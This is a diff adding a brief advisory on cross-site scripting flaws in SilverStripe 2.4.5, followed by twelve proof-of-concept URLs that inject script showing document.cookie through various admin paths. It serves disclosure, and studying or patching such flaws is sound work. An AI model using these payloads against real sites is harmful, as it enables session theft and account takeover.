@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/50063/info
+
+SilverStripe is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+SilverStripe 2.4.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/SilverStripe-v2.4.5/admin/reports/?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/comments/?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/4?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/2?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/root?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/3?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/assets/?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/1?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/show/5?&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/SilverStripe-v2.4.5/admin/security/?&#039;"</script><script>alert(document.cookie)</script>
+
+
